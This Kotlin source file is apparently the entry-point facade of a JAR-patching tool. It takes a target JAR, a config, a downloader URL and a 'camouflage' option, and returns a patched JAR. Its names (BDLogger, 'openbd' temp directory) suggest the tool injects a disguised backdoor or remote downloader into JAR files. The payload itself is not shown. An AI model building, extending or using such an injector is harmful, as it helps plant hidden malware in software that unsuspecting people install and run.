package com.tmquan2508.inject

import com.google.gson.Gson
import com.tmquan2508.inject.config.Config
import com.tmquan2508.inject.core.JarPatcher
import com.tmquan2508.inject.log.BDLogger
import java.nio.file.Files
import kotlin.io.path.readBytes
import kotlin.io.path.writeBytes

object PatcherFacade {
    fun patchJar(
        inputJarBytes: ByteArray,
        configJson: String,
        downloaderUrl: String,
        useCamouflage: Boolean,
        logger: BDLogger,
        originalFileName: String = "target.jar"
    ): ByteArray {
        val config = Gson().fromJson(configJson, Config::class.java)
            ?: throw IllegalArgumentException("Could not parse configuration JSON.")

        val tempDir = Files.createTempDirectory("openbd_facade_")
        val tempInputPath = tempDir.resolve(originalFileName)
        val tempOutputPath = tempDir.resolve("patched-$originalFileName")

        try {
            tempInputPath.writeBytes(inputJarBytes)

            val patcher = JarPatcher(
                inputPath = tempInputPath,
                outputPath = tempOutputPath,
                camouflage = useCamouflage,
                config = config,
                configJson = configJson,
                downloaderUrl = downloaderUrl,
                logger = logger
            )

            val patchSuccessful = patcher.patch()

            return if (patchSuccessful && Files.exists(tempOutputPath)) {
                tempOutputPath.readBytes()
            } else {
                inputJarBytes
            }
        } finally {
            tempDir.toFile().deleteRecursively()
        }
    }
}